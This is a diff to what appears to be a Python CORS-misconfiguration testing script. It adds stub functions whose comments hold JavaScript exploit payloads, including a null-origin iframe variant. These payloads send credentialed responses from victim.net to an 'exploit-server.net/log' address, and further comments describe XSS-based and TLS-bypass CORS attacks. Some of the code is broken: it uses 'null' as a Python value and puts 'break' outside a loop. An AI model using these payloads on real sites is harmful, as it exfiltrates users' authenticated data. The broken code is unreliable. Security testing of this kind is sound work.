@@ -32,24 +32,86 @@ import requests
 # Intranets and CORS without credentials
 ## one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.
 
-def server_generated_acao_header_from_client_specified_origin_header(target):
-    # check "Access-Control-Allow-Credentials: true" in Response
-    response = requests.get('https://' + target , headers={'Origin': 'test.com'})
-    print(response.headers)
-    # send request with "Origin: https://malicious-site.com"
-    # check for response "Access-Control-Allow-Origin: https://malicious-site.com"
+def server_generated_acao_header_from_client_specified_origin_header(target=null, responses=null):
+    # pass the value of Origin when accessing the sensitive endpoint
+    # <script>
+    # var req = new XMLHttpRequest();
+    # req.onload = reqListener;
+    # req.open('get', 'https://victim.net/sensitiveEndpoint',true);
+    # req.setRequestHeader('Origin': 'https://exploit-server.net/');
+    # req.withCredentials = true;
+    # req.send();
+
+    # function reqListener() {
+    # location='https://exploit-server.net/log?key='+this.responseText;
+    # };
+    # </script>
+    if target:
+        # check "Access-Control-Allow-Credentials: true" in Response
+        response = requests.get('https://' + target , headers={'Origin': 'test.com'})
+        print(response.headers)
+        # send request with "Origin: https://malicious-site.com"
+        # check for response "Access-Control-Allow-Origin: https://malicious-site.com"
+    elif responses:
+        # need to decide do I split the responses, only need one or parse within function
+        responses = ''
+    else:
+        return "argument required: target or responses"
+        break
     return True
 
 def error_parsing_origin_header():
     return True
 
 def whitelisted_null_origin_value():
+    # Use an iframe to pass the origin as null
+    # <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+    # var req = new XMLHttpRequest();
+    # req.onload = reqListener;
+    # req.open('get', 'https://victim.net/sensitiveEndpoint',true);
+    # req.withCredentials = true;
+    # req.send();
+
+    # function reqListener() {
+    # location='https://exploit-server.net/log?key='+this.responseText;
+    # };
+    # </script>"></iframe>
     return True
 
 def xss_via_cors_trust_relationships():
+    # If whitelisted domain is vulnerable to XSS then trusting site is vulnerable
+    # Request:
+    #     GET /api/requestApiKey HTTP/1.1
+    #     Host: vulnerable-website.com
+    #     Origin: https://subdomain.vulnerable-website.com
+    #     Cookie: sessionid=...
+    # Response:
+    #     HTTP/1.1 200 OK
+    #     Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+    #     Access-Control-Allow-Credentials: true
+    # Exploit:
+    #     https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
     return True
 
 def breaking_tls_via_CORS_misconfiguration():
+    # An attacker who is in a position to intercept a victim user's traffic can 
+    # exploit the CORS configuration to compromise the victim's interaction with 
+    # the application. This attack involves the following steps:
+    # The victim user makes any plain HTTP request.
+    # The attacker injects a redirection to:
+    # http://trusted-subdomain.vulnerable-website.com
+
+    # The victim's browser follows the redirect.
+    # The attacker intercepts the plain HTTP request,
+    # and returns a spoofed response containing a CORS request to:
+    # https://vulnerable-website.com
+
+    # The victim's browser makes the CORS request, including the origin:
+    # http://trusted-subdomain.vulnerable-website.com
+    
+    # The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
+    # The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
+    # This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.
     return True
 
 def intranet_cors_without_credentials():
